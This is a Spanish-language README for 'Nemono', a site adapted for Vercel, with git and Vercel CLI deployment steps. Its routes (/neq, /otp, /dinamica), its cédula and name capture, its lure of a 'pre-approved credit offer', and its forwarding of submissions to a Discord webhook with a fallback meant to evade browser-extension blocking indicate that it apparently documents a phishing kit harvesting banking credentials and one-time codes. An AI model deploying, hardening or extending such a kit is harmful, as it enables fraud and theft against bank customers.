# Nemono - Adaptado para Vercel 🚀

Este proyecto ha sido optimizado y adaptado arquitectónicamente para ser desplegado en **Vercel** de manera fluida y profesional.

---

## 🛠 Mejoras y Adaptaciones Realizadas

1. **Configuración de Vercel (`vercel.json`)**:
   - `cleanUrls: true`: URLs limpias sin extensión obligatoria (ejemplo: `/neq`, `/otp`, `/dinamica`).
   - `rewrites`: Mapeo de rutas legacy (`.php`) y resolución insensible a mayúsculas/minúsculas para servidores Linux en la nube.
   - `headers`: Headers de seguridad global (`X-Frame-Options`, `X-Content-Type-Options`) y caché optimizado para recursos estáticos.

2. **Serverless Function para Envíos (`/api/send.js`)**:
   - Endpoint backend en Node.js que actúa como intermediario seguro para enviar notificaciones a Discord.
   - Elimina problemas de restricciones de **CORS** y bloqueos por extensiones de navegador.
   - Soporte opcional de variable de entorno `DISCORD_WEBHOOK_URL` desde el panel de Vercel.

3. **Módulo Dual Client-Side (`js/api.js`)**:
   - Envío prioritario a `/api/send` (Vercel).
   - Fallback automático directo al Webhook si la API no estuviera disponible (máxima resiliencia).

4. **Flujo y Validaciones en `index.html`**:
   - Validación de cédula y nombre completo.
   - Animación de carga y despliegue responsivo de la oferta de crédito pre-aprobada.
   - Redirección con persistencia de datos en `localStorage`.

5. **Corrección de Sensibilidad de Archivos (Linux Case-Sensitivity)**:
   - Se corrigieron referencias a mayúsculas (`OTP.html` -> `otp.html`).
   - Se depuraron referencias a bundles externos no existentes para evitar errores `404` en consola.

---

## 🚀 Cómo Desplegar en Vercel

### Opción A: Despliegue mediante GitHub / GitLab / Bitbucket (Recomendado)

1. **Inicializar Git y hacer commit**:
   ```bash
   git init
   git add .
   git commit -m "feat: adaptacion completa para Vercel"
   ```

2. **Subir a tu repositorio en GitHub**:
   ```bash
   git remote add origin https://github.com/TU_USUARIO/TU_REPOSITORIO.git
   git branch -M main
   git push -u origin main
   ```

3. **Importar en Vercel**:
   - Ve a [vercel.com/new](https://vercel.com/new).
   - Conecta tu cuenta de GitHub y selecciona el repositorio.
   - Deja la configuración por defecto (Framework Preset: **Other**).
   - *(Opcional)* En **Environment Variables**, puedes agregar:
     - **Name**: `DISCORD_WEBHOOK_URL`
     - **Value**: `https://discord.com/api/webhooks/...`
   - Haz clic en **Deploy**. ¡Listo en 30 segundos!

---

### Opción B: Despliegue Directo con Vercel CLI

1. Si no tienes Vercel CLI instalado:
   ```bash
   npm install -g vercel
   ```

2. Ejecuta el comando de inicio de sesión:
   ```bash
   vercel login
   ```

3. En la carpeta del proyecto, ejecuta:
   ```bash
   vercel
   ```
   - Responde `Y` para configurar el proyecto.
   - Sigue los pasos interactivos (deja todo por defecto presionando Enter).

4. Para desplegar a producción:
   ```bash
   vercel --prod
   ```

---

## 💻 Prueba Local

Para probar el proyecto localmente antes de subirlo:

```bash
# Opción 1: Con Vercel CLI (soporta tanto estáticos como /api/send)
npx vercel dev

# Opción 2: Con servidor web local estático
npm run dev
```
